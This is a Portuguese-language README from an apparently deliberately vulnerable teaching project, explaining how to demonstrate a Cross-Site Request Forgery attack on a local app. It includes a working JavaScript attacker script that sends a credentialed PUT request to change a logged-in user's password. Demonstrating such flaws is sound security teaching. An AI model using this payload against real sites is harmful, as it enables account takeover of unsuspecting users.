# COMO RODAR AS VULNERABILIDADES


## Cross-Site Request Forgery (CSRF)

1 - Necessário fazer login da pagina original

https://github.com/user-attachments/assets/c6f8c93f-76e1-4d5b-81af-a89eb2277225

2 - Após o usuário realizar o login no site oficial, os cookies de autenticação são armazenados no navegador. Esses cookies podem ser aproveitados por outra página web para enviar uma solicitação maliciosa, como, por exemplo, para a rota localhost:5000/api/updateSenha.


https://github.com/user-attachments/assets/af4c2424-6f6b-4a90-bf39-9a448ca09916

3 - Dessa forma, o cookie do usuário autenticado é enviado ao servidor na solicitação, permitindo que um atacante altere a senha do usuário de maneira maliciosa, explorando a ausência de proteções adequadas, como validação de tokens CSRF.

Exemplo do script do atacante:
```js
      const hackerAlteraSenha = async () => {
        fetch("http://localhost:5000/api/userPassword", {
          method: "PUT",
          credentials: "include",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            novaSenha: "senhahackeada",
          }),
        })
          .then((res) => {
            if (!res.ok) {
              return res.json().then((data) => {
                throw new Error(data.message || "Erro desconhecido");
              });
            }
            return res.json();
          })
          .then((data) => {
            if (data.success) {
              console.log({ data });

              alert("Senha alterada!");
            }
          })
          .catch((error) => {
            console.error("Erro:", error.message);
          });
      };
```
4 - Conclusão, no banco de dados a senha do usuário foi alterada.

![image](https://github.com/user-attachments/assets/5cb42999-9207-4030-8a84-5be76804a93d)

